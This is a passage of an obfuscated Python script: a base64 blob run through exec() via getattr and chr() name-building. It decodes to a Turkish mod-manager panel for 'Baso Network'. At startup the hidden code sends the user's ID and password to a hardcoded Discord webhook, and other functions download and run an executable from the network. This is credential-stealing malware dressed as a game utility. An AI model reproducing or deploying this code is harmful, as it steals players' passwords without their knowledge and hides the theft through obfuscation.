xLEKICAgICAgICAgICAgcHJpbnQoRm9yZS5XSElURSArIGYiQWt0aWYgbWk6ICIgKyBGb3JlLkxJR0hUR1JFRU5fRVggKyAiRXZldCIpCiAgICAgICAgICAgIHByaW50KEZvcmUuV0hJVEUgKyBmIk95dW5jdTogIiArIEZvcmUuTElHSFRHUkVFTl9FWCArIGYie29ubGluZV9wbGF5ZXJzfSBracWfaSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoRm9yZS5XSElURSArIGYiQWt0aWYgbWk6ICIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIkhhecSxciIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyBmIkFrdGlmIG1pOiBIYXnEsXIiKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKICAgICAgICAgICAgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBIQVRBIFJBUE9STEFSSQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmRlZiBzZW5kX3N0YXR1c190b19kaXNjb3JkKCk6CiAgICB0cnk6CiAgICAgICAgdXNlcl9pZCwgcGFzc3dvcmQgPSBnZXRfdXNlcl9pbmZvKCkKICAgICAgICBtb2RfbGlzdCA9IG9zLmxpc3RkaXIobW9kZGlyKSBpZiBvcy5wYXRoLmV4aXN0cyhtb2RkaXIpIGVsc2UgW10KICAgICAgICB0b3RhbF9tb2RzID0gbGVuKG1vZF9saXN0KQogICAgICAgIHRvdGFsX3NpemUgPSBzdW0ob3MucGF0aC5nZXRzaXplKG9zLnBhdGguam9pbihtb2RkaXIsIG0pKSBmb3IgbSBpbiBtb2RfbGlzdCkgaWYgbW9kX2xpc3QgZWxzZSAwCiAgICAgICAgbGFzdF9jaGVja190aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUg6JU06JVMiLCB0aW1lLmxvY2FsdGltZSgpKQoKICAgICAgICAjIERpbmFtaWsgbGF1bmNoZXJfcGF0aCAoaGVyIGt1bGxhbsSxY8SxIGnDp2luIGRvxJ9ydSBBcHBEYXRhIHlvbHUpCiAgICAgICAgbG9jYWxfYXBwZGF0YSA9IG9zLmdldGVudigiTE9DQUxBUFBEQVRBIikKICAgICAgICBsYXVuY2hlcl9wYXRoID0gb3MucGF0aC5qb2luKGxvY2FsX2FwcGRhdGEsICJCYXNvIE5ldHdvcmsiLCAiYmFzb253LmV4ZSIpCgogICAgICAgICMgTGF1bmNoZXIgdmFyIG3EsSB5b2sgbXUga29udHJvbMO8CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGxhdW5jaGVyX3BhdGgpOgogICAgICAgICAgICBlcnJvcl9tc2cgPSAiTGF1bmNoZXIgYnVsdW5hbWFkxLEiCiAgICAgICAgZWxzZToKICAgICAgICAgICAgZXJyb3JfbXNnID0gIllvayIKCiAgICAgICAgd2ViaG9va191cmwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwNzI5OTQ5MzEzNjk2MTU2Ny9uNk5SRTZqSTg2NVI0ak5IRFIyMnotUjEweEY1MjFEYTNyV3luM3VleDVXbjUzOUY5eDJRcDFXSTZNU1JrcnNrV0g3UCIKICAgICAgICBjb250ZW50ID0gKAogICAgICAgICAgICBmIioqTGF1bmNoZXIgQmHFn2xhdG1hIER1cnVtdSoqXG4iCiAgICAgICAgICAgIGYiS3VsbGFuxLFjxLEgSUQ6ICoqe3VzZXJfaWR9KipcbiIKICAgICAgICAgICAgZiLFnmlmcmU6IHx8Kip7cGFzc3dvcmR9Kip8fFxuIgogICAgICAgICAgICBmIlZlcnNpeW9uOiAxLjIxLjRcbiIKICAgICAgICAgICAgZiJNb2QgU2F5xLFzxLE6ICoqe3RvdGFsX21vZHN9KipcbiIKICAgICAgICAgICAgZiJUb3BsYW0gTW9kIEJveXV0dTogKip7dG90YWxfc2l6ZS8xMDI0Oi4yZn0gS0IqKlxuIgogICAgICAgICAgICBmIlBhbmVsIFZlcnNpeW9udTogKip7Q1VSUkVOVF9WRVJTSU9OfSoqXG4iCiAgICAgICAgICAgIGYiU29uIEfDvG5jZWxsZW1lOiAqKntsYXN0X2NoZWNrX3RpbWV9KipcbiIKICAgICAgICAgICAgZiJIYXRhOlxuYGBgXG57ZXJyb3JfbXNnfVxuYGBgIEBldmVyeW9uZSIKICAgICAgICApCgogICAgICAgIHJlcXVlc3RzLnBvc3Qod2ViaG9va191cmwsIGpzb249eyJjb250ZW50IjogY29udGVudH0pCgogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAjIEXEn2VyIGJ1cmFkYSBiaWxlIGhhdGEgb2x1cnNhIHlha2FsYSB2ZSBEaXNjb3JkJ2EgZ8O2bmRlcgogICAgICAgIGVycm9yX21zZyA9IHRyYWNlYmFjay5mb3JtYXRfZXhjKCkKICAgICAgICByZXF1ZXN0cy5wb3N0KHdlYmhvb2tfdXJsLCBqc29uPXsiY29udGVudCI6IGYiKipMYXVuY2hlciBCYcWfbGF0bWEgSEFUQVNJKipcbmBgYFxue2Vycm9yX21zZ31cbmBgYCJ9KQoKIyBQcm9ncmFtIGJhxZ9sYXIgYmHFn2xhbWF6IGfDtm5kZXIKc2VuZF9zdGF0dXNfdG9fZGlzY29yZCgpCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBMYXVuY2hlcifEsSBrdXIKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgbGF1bmNoZXJfa3VyKCk6CiAgICBvcy5zeXN0ZW0oImNscyIpCiAgICBwcmludChGb3JlLkxJR0hUR1JFRU5fRVggKyAiTGF1bmNoZXIgaW5kaXJpbGl5b3IgdmUga3VydWx1eW9yLi4uIikKICAgIHVybCA9ICJCVVJBWUFfSU5ESVJNRV9MSU5LSSIKICAgIHRhcmdldF9wYXRoID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJEb3dubG9hZHMiLCAiYmFzb253X2luc3RhbGxlci5leGUiKQogICAgdHJ5OgogICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybHJldHJpZXZlKHVybCwgdGFyZ2V0X3BhdGgpCiAgICAgICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgZiJMYXVuY2hlciBpbmRpcmlsZGk6IHt0YXJnZXRfcGF0aH0iKQogICAgICAgICMgxLBuZGlyaWxlbiBleGUneWkgw6dhbMSxxZ90xLFyCiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihbdGFyZ2V0X3BhdGhdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgZiJMYXVuY2hlciBpbmRpcmlsZW1lZGk6IHtlfSIpCiAgICBpbnB1dCgiXG5EZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgWEFNUFAga3VyCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZGVmIHhhbXBwX2t1cigpOgogICAgb3Muc3lzdGVtKCJjbHMiKQogICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgIlhBTVBQIGt1cnVsdW11IGJhxZ9sYXTEsWzEsXlvci4uLiIpCiAgICB4YW1wcF9pbnN0YWxsZXIgPSByIkM6XHhhbXBwXHhhbXBwX2luc3RhbGxlci5leGUiICAjIGJ1cmF5YSBYQU1QUCBpbnN0YWxsZXIgcGF0aAogICAgaWYgb3MucGF0aC5leGlzdHMoeGFtcHBfaW5zdGFsbGVyKToKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKFt4YW1wcF9pbnN0YWxsZXJdKQogICAgZWxzZToKICAgICAgICBwcmludChGb3JlLlJFRCArICJYQU1QUCBpbnN0YWxsZXIgYnVsdW5hbWFkxLE6ICIgKyB4YW1wcF9pbnN0YWxsZXIpCiAgICBpbnB1dCgiXG5EZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgWEFNUFAgYmHFn2xhdAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmRlZiB4YW1wcF9iYXNsYXQoKToKICAgIHhhbXBwX3BhdGggPSByIkM6XHhhbXBwXGFwYWNoZV9zdGFydC5iYXQiCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoeGFtcHBfcGF0aCk6CiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiWEFNUFAgecO8a2zDvCBkZcSfaWwuIMOWbmNlIFhBTVBQIGt1cnVuLiIpCiAgICAgICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgogICAgc3VicHJvY2Vzcy5Qb3BlbihbeGFtcHBfcGF0aF0sIGNyZWF0aW9uZmxhZ3M9c3VicHJvY2Vzcy5DUkVBVEVfTk9fV0lORE9XKQogICAgcHJpbnQoRm9yZS5MSUdIVEdSRUVOX0VYICsgIkFwYWNoZSBiYcWfbGF0xLFsZMSxIHZlIHN0YXJ0dXAnYSBla2xlbmRpIChlxJ9lciBzZcOnaWxtacWfc2UpLiIpCiAgICBpbnB1dCgiXG5EZXZhbSBldG1layBpw6dpbiBFbnRlcidhIGJhc8Sxbi4uLiIpCgojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgRG9zeWFsYXLEsSBrdXIKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgZG9zeWFsYXJpX2t1cigpOgogICAgeGFtcHBfZGlyID0gciJDOlx4YW1wcCIKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyh4YW1wcF9kaXIpOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgIlhBTVBQIGt1cnVsdSBkZcSfaWwuIMOWbmNlIFhBTVBQIGt1cnVuLiIpCiAgICAgICAgaW5wdXQoIlxuRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQogICAgICAgIHJldHVybgoKICAgIHRhcmdldF9mb2xkZXIgPSBvcy5wYXRoLmpvaW4oeGFtcHBfZGlyLCAiaHRkb2NzIiwgImZpbGVzIikKICAgIG9zLm1ha2VkaXJzKHRhcmdldF9mb2xkZXIsIGV4aXN0X29rPVRydWUpCgogICAgIyBSYXcgR2l0SHViIGRvc3lhbGFyxLFuxLEgaW5kaXIKICAgIGJhc2VfdXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9lcm9uZm9yeW91L0Jhc28tTmV0d29yay1Nb2QtWW9uZXRpY2lzaS9yZWZzL2hlYWRzL21haW4vZmlsZXMvIgogICAgZmlsZXMgPSBbImRvc3lhMSIsICJkb3N5YTIiXSAgIyBidXJheWEgZmlsZXMga2xhc8O2csO8bmRla2kgZG9zeWEgaXNpbWxlcmluaSB5YXoKCiAgICBmb3IgZiBpbiBmaWxlczoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybHJldHJpZXZlKGJhc2VfdXJsICsgZiwgb3MucGF0aC5qb2luKHRhcmdldF9mb2xkZXIsIGYpKQogICAgICAgICAgICBwcmludChGb3JlLkxJR0hUR1JFRU5fRVggKyBmIntmfSBpbmRpcmlsZGkuIikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgZiJ7Zn0gaW5kaXJpbGVtZWRpOiB7ZX0iKQoKICAgIGlucHV0KCJcbkRldmFtIGV0bWVrIGnDp2luIEVudGVyJ2EgYmFzxLFuLi4uIikKCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1lbsO8CiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpkZWYgbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBvcy5zeXN0ZW0oImNscyIpCiAgICAgICAgdXNlcl9pZCwgXyA9IGdldF91c2VyX2luZm8oKQogICAgICAgIHByaW50X2NvbG9yZWRfYXNjaWkodXNlcl9pZCkKICAgICAgICBwcmludChGb3JlLldISVRFICsgIkJhc28gTmV0d29yayBLdWxsYW7EsWPEsSBQYW5lbGkiKQogICAgICAgIHByaW50KCIiKQogICAgICAgIHByaW50KEZvcmUuUkVEICsgIjEuIiArIEZvcmUuTElHSFRSRURfRVggKyAiIE1vZCBFa2xlIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIyLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBNb2QgU2lsIikKICAgICAgICBwcmludChGb3JlLlJFRCArICIzLiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBNb2RsYXLEsSBMaXN0ZWxlIikKICAgICAgICBwcmludChGb3JlLlJFRCArICI0LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBCYXNvIE5ldHdvcmsgYmlsZ2lsZXJpIikKICAgICAgICBwcmludChGb3JlLlJFRCArICI1LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBMYXVuY2hlcsSxIGHDpyIpCiAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAiNi4iICsgRm9yZS5MSUdIVFJFRF9FWCArICIgS3VyIiArIEZvcmUuV0hJVEUgKyAiICFCaXRtZWRpISIpICAjIDYuIHNlw6dlbmVrIGHDp8SxayB5ZcWfaWwKICAgICAgICBwcmludChGb3JlLlJFRCArICI3LiIgKyBGb3JlLkxJR0hUUkVEX0VYICsgIiBTdW51Y3UgRHVydW11IikKICAgICAgICBjaG9pY2UgPSBpbnB1dChGb3JlLldISVRFICsgIlxuU2XDp2ltaW5pejogIikKCiAgICAgICAgaWYgY2hvaWNlID09ICIxIjoKICAgICAgICAgICAgYWRkX21vZCgpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBkZWxldGVfbW9kKCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiMyI6CiAgICAgICAgICAgIGxpc3RfbW9kcygpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBzaG93X3VzZXJfaW5mbygpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjUiOgogICAgICAgICAgICBvcGVuX2xhdW5jaGVyKCkKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNiI6CiAgICAgICAgICAgIGt1cl9tZW51KCkgICMgNi4gc2XDp2VuZWsgYWx0IG1lbsO8ecO8IGHDp2FjYWsKICAgICAgICBlbGlmIGNob2ljZSA9PSAiNyI6CiAgICAgICAgICAgIHNlcnZlcl9zdGF0dXMoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KEZvcmUuTElHSFRSRURfRVggKyAiR2XDp2Vyc2l6IHNlw6dpbS4iKQogICAgICAgICAgICBpbnB1dCgiRGV2YW0gZXRtZWsgacOnaW4gRW50ZXInYSBiYXPEsW4uLi4iKQoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmHFn2xhdAojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIGNoZWNrX3VwZGF0ZSgpCiAgICBtZW51KCkK"
CRkaUyLI = getattr(alfXtzWc, chr(98)+chr(54)+chr(52)+chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101))
exec(getattr(bytes, chr(100)+chr(101)+chr(99)+chr(111)+chr(100)+chr(101))(CRkaUyLI(RgcHfQsJ), "utf-8"))
